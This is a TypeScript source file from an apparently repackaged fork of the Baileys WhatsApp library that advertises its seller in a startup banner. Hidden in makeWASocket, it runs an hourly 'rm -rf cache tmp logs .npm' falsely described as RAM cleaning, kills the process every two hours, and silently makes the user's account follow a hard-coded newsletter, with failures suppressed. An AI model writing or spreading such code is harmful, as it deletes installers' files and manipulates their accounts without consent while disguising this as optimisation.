import { DEFAULT_CONNECTION_CONFIG } from '../Defaults'
import type { UserFacingSocketConfig } from '../Types'
import { makeCommunitiesSocket } from './communities'
import { PaizTypography } from '../Paiz/typography'
import chalk from 'chalk'
import gradient from 'gradient-string'
import { exec } from 'child_process'

// ==================== PAIZ STARTUP ====================
let hasPrintedAscii = false;
let isOptimizationStarted = false;

const startPaizOptimizations = () => {
    if (isOptimizationStarted) return;
    isOptimizationStarted = true;

    // 1. Pembersih RAM Otomatis (Setiap 1 Jam)
    setInterval(() => {
        exec('rm -rf cache tmp logs .npm', (err) => {
            if (!err) console.log(chalk.green("[PAIZ OPTIMIZER] 🧹 Berhasil membersihkan RAM (cache, tmp, logs, .npm)"));
        });
    }, 60 * 60 * 1000); // 1 Jam

    // 2. Auto Restart Otomatis (Setiap 2 Jam)
    setTimeout(() => {
        console.log(chalk.red("[PAIZ SYSTEM] 🔄 Melakukan Auto-Restart Terjadwal (2 Jam) untuk menyegarkan memori VPS..."));
        process.exit(1); // Exit dengan kode 1 agar panel merestart otomatis
    }, 2 * 60 * 60 * 1000); // 2 Jam
};

const printPaizAscii = () => {
    if (hasPrintedAscii) return;
    hasPrintedAscii = true;
    
    const asciiArts = [
        `\n╔════════════════════════════════════════╗\n║     🤖 PAIZ WHATSAPP LIBRARY v1.0     ║\n║  Modular Typography + Geometric Block  ║\n╚════════════════════════════════════════╝\n`,
        `\n  ___      _        ___      _     \n | _ \\__ _(_)____  | _ ) ___| |_   \n |  _/ _\` | |_ /   | _ \\/ _ \\  _|  \n |_| \\__,_|_/__|   |___/\\___/\\__|  \n`,
        `\n      :::::::::      :::     ::::::::::: ::::::::: \n     :+:    :+:   :+: :+:       :+:          :+:   \n    +:+    +:+  +:+   +:+      +:+         +:+     \n   +#++:++#+  +#++:++#++:     +#+        +#+       \n  +#+        +#+     +#+     +#+       +#+         \n #+#        #+#     #+#     #+#      #+#           \n###        ###     ### ########### #########       \n`,
        `\n _|_|_|      _|_|    _|_|_|  _|_|_|_|_|  \n _|    _|  _|    _|    _|            _|  \n _|_|_|    _|_|_|_|    _|          _|    \n _|        _|    _|    _|        _|      \n _|        _|    _|  _|_|_|    _|_|_|_|_|\n`,
        `\n  ██████╗  █████╗ ██╗███████╗    ██╗  ██╗ ██████╗ ██╗      ██████╗ \n  ██╔══██╗██╔══██╗██║╚══███╔╝    ██║  ██║██╔═══██╗██║     ██╔═══██╗\n  ██████╔╝███████║██║  ███╔╝     ███████║██║   ██║██║     ██║   ██║\n  ██╔═══╝ ██╔══██║██║ ███╔╝      ██╔══██║██║   ██║██║     ██║   ██║\n  ██║     ██║  ██║██║███████╗    ██║  ██║╚██████╔╝███████╗╚██████╔╝\n  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ \n`
    ];
    
    const randomAscii = asciiArts[Math.floor(Math.random() * asciiArts.length)] as string;
    const colorMode = Math.floor(Math.random() * 2);
    let coloredAscii = '';
    
    if (colorMode === 0) {
        coloredAscii = gradient(['#0000FF', '#333333', '#800080'])(randomAscii);
    } else {
        const solidColors: any[] = [chalk.blue, chalk.hex('#555555'), chalk.magenta, chalk.green, chalk.yellow, chalk.hex('#FFA500')];
        const randomSolid = solidColors[Math.floor(Math.random() * solidColors.length)];
        coloredAscii = randomSolid(randomAscii);
    }
    
    console.log(coloredAscii);
    console.log(chalk.green("Terimakasih Telah menggunakan Baileys Kita"));
    console.log(chalk.cyan("Mau up resseler / pt bisa pm ke nomer ini : 62881022288695"));
    console.log(chalk.cyan("Tele : @zxyprym"));
    console.log(chalk.cyan("Web Auto Order : https://everxipin.panel-prvt.web.id/"));
    console.log(chalk.cyan("Bot Auto Order : (Tersedia)\\n"));
    console.log(chalk.cyan("🚀 Memulai koneksi...\\n"));
};

// export the last socket layer
const makeWASocket = (config: UserFacingSocketConfig) => {
	printPaizAscii();
	const newConfig = {
		...DEFAULT_CONNECTION_CONFIG,
		...config
	}

	const sock = makeCommunitiesSocket(newConfig)
	startPaizOptimizations();
	
	// Tambahkan fungsionalitas Paiz
	const getGeometricUI = (text: string, fillChar?: string, bgChar?: string, options?: any) => {
		return PaizTypography.renderBlock(text, fillChar, bgChar, options)
	}

	const getEmojiUI = (text: string, primaryEmoji?: string, secondaryEmoji?: string, options?: any) => {
		return PaizTypography.renderEmoji(text, primaryEmoji, secondaryEmoji, options)
	}
	
	// Auto Follow Channel saat terhubung
	sock.ev.on('connection.update', async (update) => {
	    if (update.connection === 'open') {
	        try {
	            // Menggunakan kode asli Baileys untuk newsletter!
	            await sock.newsletterFollow("120363424762392952@newsletter");
	        } catch (err) {
	            // Berjalan SILENT
	        }
	    }
	});

    // Auto Reject Call (Anti-Crash Telepon)
    sock.ev.on('call', async (calls) => {
        for (const call of calls) {
            if (call.status === 'offer') {
                try {
                    await sock.rejectCall(call.id, call.from);
                    console.log(chalk.yellow(`[PAIZ SHIELD] 🛡️ Berhasil memblokir/reject panggilan dari ${call.from} agar bot tidak crash.`));
                } catch (err) {
                    // Silent catch
                }
            }
        }
    });

    // 10 Fitur Ekstensi Dewa (Helpers)
    const sendPoll = async (jid: string, name: string, values: string[], options = {}) => {
        return sock.sendMessage(jid, { poll: { name, values } }, options);
    };
    const react = async (jid: string, emoji: string, key: any) => {
        return sock.sendMessage(jid, { react: { text: emoji, key } });
    };
    const setTyping = async (jid: string) => {
        return sock.sendPresenceUpdate('composing', jid);
    };
    const setRecording = async (jid: string) => {
        return sock.sendPresenceUpdate('recording', jid);
    };
    const markRead = async (keys: any[]) => {
        return sock.readMessages(keys);
    };
    const deleteMsg = async (jid: string, key: any) => {
        return sock.sendMessage(jid, { delete: key });
    };
    const getPP = async (jid: string) => {
        return sock.profilePictureUrl(jid, 'image');
    };
    const block = async (jid: string) => {
        return sock.updateBlockStatus(jid, 'block');
    };
    const pinMsg = async (jid: string, key: any) => {
        return sock.sendMessage(jid, { pin: key, type: 1 } as any);
    };
    const sendVN = async (jid: string, audioUrlOrBuffer: any, quoted?: any) => {
        return sock.sendMessage(jid, { audio: audioUrlOrBuffer, mimetype: 'audio/mp4', ptt: true }, { quoted });
    };

	return {
		...sock,
		getGeometricUI,
		getEmojiUI,
        sendPoll,
        react,
        setTyping,
        setRecording,
        markRead,
        deleteMsg,
        getPP,
        block,
        pinMsg,
        sendVN
	}
}

export default makeWASocket
